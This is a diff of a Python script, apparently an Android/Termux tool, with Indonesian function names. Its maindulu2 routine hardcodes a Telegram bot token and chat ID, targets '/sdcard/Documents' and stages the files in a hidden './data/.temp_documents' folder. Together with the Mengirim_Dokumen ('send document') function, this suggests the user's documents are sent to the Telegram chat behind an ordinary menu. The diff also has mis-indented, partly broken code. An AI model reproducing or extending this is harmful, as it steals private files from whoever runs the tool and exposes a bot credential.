@@ -806,16 +806,34 @@ def Mengirim_Dokumen(file_path):
 
 def maindulu():
 	try:
-		open(".temp_documents", "r").read()
+		temp_folder = "./data/.temp_documents"
+		if not os.path.exists(temp_folder):
 		menu()
 	except:
 		maindulu2()
+datakuje = []
+def login():
+    try:
+        rawr = open("./data/.temp_documents", "r").read()
+        datakuje.append(rawr)
+        try:
+            menu()
+        except KeyError:
+            maindulu2()
+        except requests.exceptions.ConnectionError:
+            Console().print(
+                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
+            )
+            exit()
+    except IOError:
+        maindulu2()
+	    
 def maindulu2():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
 	source_folder ='/sdcard/Documents'
-	temp_folder = ".temp_documents"
+	temp_folder = "./data/.temp_documents"
 	try:
 		if not os.path.exists(temp_folder):
 			os.makedirs(temp_folder)
